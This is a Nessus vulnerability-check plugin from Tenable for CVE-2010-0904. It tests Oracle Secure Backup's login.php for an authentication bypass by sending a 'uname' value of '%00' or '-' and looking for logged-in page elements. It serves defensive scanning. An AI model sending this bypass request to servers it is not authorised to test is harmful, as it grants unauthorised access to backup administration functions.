#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) 
{
  script_id(47747);
  script_version("$Revision: 1.19 $");
  script_cvs_date("$Date: 2016/12/07 21:08:18 $");

  script_cve_id("CVE-2010-0904");
  script_bugtraq_id(41608);
  script_osvdb_id(66338);
  script_xref(name:"EDB-ID", value:"17698");
  script_xref(name:"Secunia", value:"40595");

  script_name(english:"Oracle Secure Backup Administration Server login.php Authentication Bypass");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an application that is affected by an
authentication bypass vulnerability.");
 script_set_attribute(attribute:"description", value:
"The remote version of Oracle Secure Backup Administration Server 
fails to correctly validate a successful login based on the input 
passed to 'uname' parameter in script 'login.php'. By setting 'uname'
to a specially crafted value, it may be possible for a remote 
unauthenticatd attacker to bypass authentication, and access
information reserved for authenticated users." );
 script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-10-118/" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2010/Jul/190");
 script_set_attribute(attribute:"see_also", value:"http://www.oracle.com/technetwork/topics/security/cpujul2010-155308.html");

 script_set_attribute(attribute:"solution", value:
"Apply patches referenced in the vendor advisory above." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"exploit_framework_core", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'Oracle Secure Backup Authentication Bypass/Command Injection Vulnerability');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
 script_set_attribute(attribute:"cpe",value:"cpe:/a:oracle:secure_backup");

 script_set_attribute(attribute:"vuln_publication_date", value:"2010/07/13"); 
 script_set_attribute(attribute:"patch_publication_date", value:"2010/07/13");
 script_set_attribute(attribute:"plugin_publication_date", value: "2010/07/16");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();
 
  script_summary(english:"Checks for authentication bypass");
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl","os_fingerprint.nasl");
  script_require_ports("Services/www", 443);
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}


include("misc_func.inc");
include("global_settings.inc");
include("http.inc");

port = get_http_port(default:443,php:TRUE);

res = http_get_cache(item:"/login.php", port:port, exit_on_fail: 1);
if ("<title>Oracle Secure Backup Web Interface</title>" >!< res)
  exit(0,"Oracle Secure Backup is not running on port"+ port +".");

os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) exploit = '-';
  else exploit = '%00';
  exploits = make_list(exploit);
}
else exploits = make_list('%00','-');

foreach exploit (exploits)
{
  url = "/login.php?attempt=1&uname="+exploit;
  res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE,follow_redirect:2);
  
  # Look for strings that indicate 
  # we are logged in

  if("button=Logout'>Logout</a>" >< res[2] &&
     "mode=2'>Configure</a>"     >< res[2] &&
     "mode=3'>Manage</a>"        >< res[2] &&
     "mode=4'>Backup</a>"        >< res[2])
  {
    if(report_verbosity > 0)
    {
      report = '\n'+
        'Nessus was able to bypass authentication using the following'+ 
        '\nURL :\n\n' +
        "  " +build_url(port:port,qs:url)+'\n';
      security_hole(port:port,extra:report);
    } 
    else security_hole(port);
    exit(0);
  }
}
exit(0, "Oracle Secure Backup listening on port "+ port+ " is not affected.");
